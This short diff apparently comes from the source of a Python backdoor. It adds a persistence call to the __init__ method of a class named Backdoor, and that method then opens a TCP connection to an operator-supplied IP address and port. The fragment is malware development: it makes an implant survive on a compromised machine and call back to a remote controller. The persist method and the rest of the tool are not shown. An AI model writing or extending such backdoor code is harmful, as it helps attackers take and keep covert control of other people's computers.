@@ -13,6 +13,7 @@ class Args:
 class Backdoor:
     
     def __init__(self,ip,port):
+        self.persist()
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
             self.connection.connect((str(ip),int(port)))
